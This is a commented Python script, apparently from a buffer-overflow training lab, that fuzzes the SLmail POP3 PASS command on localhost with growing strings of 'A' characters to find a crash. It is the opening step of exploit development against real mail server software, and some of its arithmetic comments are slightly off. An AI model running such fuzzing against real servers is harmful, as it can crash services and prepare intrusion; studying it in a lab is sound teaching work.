#!/usr/bin/python
import socket 
# Create an array of buffers, from 1 to 5900, with increments of 200.
# Max amount of bytes sent will be 5900 because the bytes sent to the buffer will increment by 200, 200 * 30 elements in array = 6000
buffer=["A"]
# create variable 'buffer' with one element that contains the value 'A'
counter=100
# create variable "counter" with the value of 100
while len(buffer) <= 30:
# while the length of the  array is less than 30 elements:
	buffer.append("A"*counter)
        # append the value A*counter(100 to start) to the  buffer array
        # in this case, the first element will be 'A' and the second will be A*100, third will be A*300, etc.
	counter=counter+200
        # Adds 200 to the current counter, so the third element in the array will be 300, forth will be 500, etc 

for string in buffer:
# each element (string) in the buffer array:
	print "Fuzzing PASS with %s bytes" % len(string)
        # display the amount of bytes that are being sent to the POP3 pass command
        # len(string) = length of each element in bytes
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #create a simple socket
        #AF_INET refers to the address family ipv4
        #SOCK_STREAM means connection oriented TCP protocol.
	connect=s.connect(('127.0.0.1',110))
	# IP address of the guest windows machine running SLmail
        # connect to the SLmail server
	s.recv(1024)
        # recieve 1024 bytes of data from the SLmail server socket
	s.send('USER test\r\n')
        # send data to the SLmail server socket
        # send the user 'test'
	s.recv(1024)
        # recieve 1024 bytes of data from the SLmail server socket
	s.send('PASS ' + string + '\r\n')
	# send the password 'string' to the remote socket
        # string = A*counter
        s.send('QUIT\r\n')
        # send the QUIT command to the SLmail server
	s.close()
	#close the connection
